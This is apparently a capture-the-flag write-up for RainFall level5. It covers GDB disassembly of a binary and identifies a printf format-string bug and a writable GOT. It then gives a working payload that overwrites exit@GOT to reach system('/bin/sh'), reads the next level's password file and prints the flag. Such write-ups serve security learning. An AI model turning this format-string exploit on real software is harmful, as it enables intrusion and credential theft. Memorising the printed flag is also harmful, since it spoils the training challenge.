# **Level5**

In this level, we found a binary that takes input and print it back:

```bash
level5@RainFall:~$ ./level5
we
we
level5@RainFall:~$
```

## **Binary Analysis**

Using GDB, we analyzed the binary and discovered that the `main` function simply calls another function, `n`:

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n>
   0x0804850f <+11>:	leave
   0x08048510 <+12>:	ret
End of assembler dump.
```

**Analysis of Function `n`**

The `n` function uses **`fgets`** to read user input into a buffer, then directly passes the buffer to **`printf`**. After printing, it calls **`exit`**.

```nasm
0x080484c2 <n+0>:       push   %ebp
0x080484c3 <n+1>:       mov    %esp,%ebp
0x080484c5 <n+3>:       sub    $0x218,%esp        ; Allocate 536 bytes
0x080484cb <n+9>:       mov    0x8049848,%eax     ; stdin
0x080484d0 <n+14>:      mov    %eax,0x8(%esp)
0x080484d4 <n+18>:      movl   $0x200,0x4(%esp)   ; Size = 512
0x080484dc <n+26>:      lea    -0x208(%ebp),%eax  ; Buffer
0x080484e2 <n+32>:      mov    %eax,(%esp)
0x080484e5 <n+35>:      call   0x80483a0 <fgets@plt>
0x080484ea <n+40>:      lea    -0x208(%ebp),%eax
0x080484f0 <n+46>:      mov    %eax,(%esp)
0x080484f3 <n+49>:      call   0x8048380 <printf@plt>
0x080484f8 <n+54>:      movl   $0x1,(%esp)
0x080484ff <n+61>:      call   0x80483d0 <exit@plt>
```

**Available Functions**

Listing all functions reveals another function, `o`, that contains shell execution logic but is never directly called:

```nasm
(gdb) info functions
All defined functions:
Non-debugging symbols:
[...]
0x080484a4  o
0x080484c2  n
[...]
```

Disassembling `o` shows that it executes **`system("/bin/sh")**:

```nasm
(gdb) disas o
Dump of assembler code for function o:
0x080484a4 <+0>:	push   %ebp
0x080484a5 <+1>:	mov    %esp,%ebp
0x080484a7 <+3>:	sub    $0x18,%esp
0x080484aa <+6>:	movl   $0x80485f0,(%esp)  ; "/bin/sh"
0x080484b1 <+13>:	call   0x80483b0 <system@plt>
0x080484b6 <+18>:	movl   $0x1,(%esp)
0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

**Finding the Format String Offset**

By providing test input, we observe the format string behavior:

```bash
level5@RainFall:~$ ./level5
AAAA %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
level5@RainFall:~$
```

The input "AAAA" (hex: 41414141) is located at **position 4** in the format string.

**GOT Analysis**

Disassembling the **`exit`** function in the Procedure Linkage Table (PLT) shows an indirect jump:

```nasm
(gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838    ; Indirect jump through GOT
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
```

The instruction **`jmp *0x8049838`** indicates that the **Global Offset Table (GOT)** entry for `exit` can be overwritten.

---

**Check GOT Writeability**

Using `checksec`, we confirm the binary's security settings:

```bash
level5@RainFall:~$ checksec --file ./level5
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level5
level5@RainFall:~$
```

- **No RELRO**: The GOT is writable.

## **Vulnerability**

The `n` function is vulnerable due to:

1. User input being passed directly to **`printf`**, enabling a format string vulnerability.
2. The writable GOT (due to **No RELRO**) allows us to overwrite the `exit` function's GOT entry.

## **Exploit**

To exploit the vulnerability, we overwrite the GOT entry for `exit` with the address of the `o` function. When `exit` is called, it will instead execute the `o` function, which invokes **`system("/bin/sh")**.

```python
# Target addresses
exit_got = "\x38\x98\x04\x08"  # exit@GOT in little-endian
o_addr = 0x080484a4  # Address of `o`

# Padding to write `o`'s address
padding = "%134513824x"  # Adjust for the value of `o`'s address 0x080484a4 - 4 (4 bytes the the pev address)

write = "%4$n"           # Write to the 4th parameter

# Construct the exploit
exploit = exit_got + padding + write
```

1. Generate the exploit:
    
    ```bash
    (python -c 'print "\x38\x98\x04\x08" + "%134513824x" + "%4$n"'; cat) | ./level5
    ```
    
2. Obtain the password:
    
    ```bash
    cat /home/user/level6/.pass
    ```
    
3. **Result**

```bash
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## **Flag**

```
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```